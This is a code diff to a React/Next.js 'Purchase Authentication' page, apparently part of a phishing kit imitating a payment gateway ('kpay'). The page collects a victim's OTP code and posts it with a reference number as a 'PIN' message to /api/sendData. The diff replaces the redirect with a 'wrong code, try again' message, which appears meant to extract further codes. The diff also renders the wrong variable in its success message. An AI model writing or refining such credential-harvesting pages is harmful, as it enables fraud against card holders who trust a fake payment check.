@@ -2,20 +2,19 @@
 import { Suspense } from "react";
 import React, { useState, useEffect } from "react";
 import 'bootstrap/dist/css/bootstrap.min.css';
-import { useRouter, useSearchParams } from 'next/navigation';
-import axios from 'axios';
-
+import { useSearchParams } from 'next/navigation';
 
 function CodePageContent() {
   const [code, setCode] = useState("");
   const [timeLeft, setTimeLeft] = useState(60); // دقيقة واحدة
   const [expired, setExpired] = useState(false);
   const [resending, setResending] = useState(false);
+  const [errorMessage, setErrorMessage] = useState(""); // رسالة الخطأ
+  const [successMessage, setSuccessMessage] = useState(""); // رسالة النجاح
 
   const searchParams = useSearchParams();
   const refN = searchParams.get("refN");
-  const price = searchParams.get('price')
-  const router = useRouter();
+  const price = searchParams.get('price');
 
   useEffect(() => {
     if (timeLeft > 0) {
@@ -25,36 +24,38 @@ function CodePageContent() {
       setExpired(true);
     }
   }, [timeLeft]);
-const handleSubmit = async () => {
-  if (!code) {
-      alert("Please fill in all fields");
+
+  const handleSubmit = async () => {
+    if (!code) {
+      setErrorMessage("الرجاء إدخال الكود");
+      setSuccessMessage("");
       return;
     }
-const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
-    
-  try {
-    
-    const res = await fetch("/api/sendData", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ text }),
-    });
 
-    const result = await res.json();
-    
+    const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
 
-    if (result.success) {
-      router.push(`/kpay/finish?refN=${refN}&price=${price}`);
-    } else {
-      alert("حدث خطأ: " + result.error);
+    try {
+      const res = await fetch("/api/sendData", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text }),
+      });
+
+      const result = await res.json();
+
+      if (result.success) {
+        setErrorMessage("");
+        setSuccessMessage("تم إرسال الكود بنجاح!");
+      } else {
+        setSuccessMessage("");
+        setErrorMessage("الكود خاطئ، يرجى المحاولة مرة أخرى");
+      }
+    } catch (err) {
+      console.error(err);
+      setSuccessMessage("");
+      setErrorMessage("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
     }
-  } catch (err) {
-    
-    console.error(err);
-    alert("حدث خطأ أثناء الإرسال");
-  }
-};
-  
+  };
 
   const handleResend = () => {
     setResending(true);
@@ -62,12 +63,18 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
       setTimeLeft(60); // إعادة دقيقة
       setExpired(false);
       setResending(false);
+      setErrorMessage("");
+      setSuccessMessage("");
     }, 1000);
   };
 
+  const handleCancel = () => {
+    setCode("");
+    setErrorMessage("");
+    setSuccessMessage("");
+  };
+
   return (
-    <>
-    
     <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }} dir="ltr">
       <div className="p-4">
         <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
@@ -81,13 +88,14 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
         <label className="fw-bold mb-2">Enter your OTP code below:</label>
         <input 
           type="text" 
-          className="form-control mb-3" 
+          className={`form-control mb-1 ${errorMessage ? "is-invalid" : ""}`} 
           value={code}
           onChange={(e) => setCode(e.target.value)}
           disabled={expired}
         />
+        {errorMessage && <div className="text-danger mb-2">{errorMessage}</div>}
+        {successMessage && <div className="text-danger mb-2">{errorMessage}</div>}
 
-        {/* عرض العداد */}
         <p className="text-danger fw-bold">
           Time left: {Math.floor(timeLeft / 60)}:{String(timeLeft % 60).padStart(2, "0")}
         </p>
@@ -114,7 +122,7 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
             <button 
               type="button" 
               className="btn btn-secondary w-50 fw-bold"
-              onClick={() => router.back()} // يرجع خطوة للخلف
+              onClick={handleCancel}
             >
               CANCEL
             </button>
@@ -126,7 +134,6 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
         </p>
       </div>
     </div>
-    </>
   );
 }
 
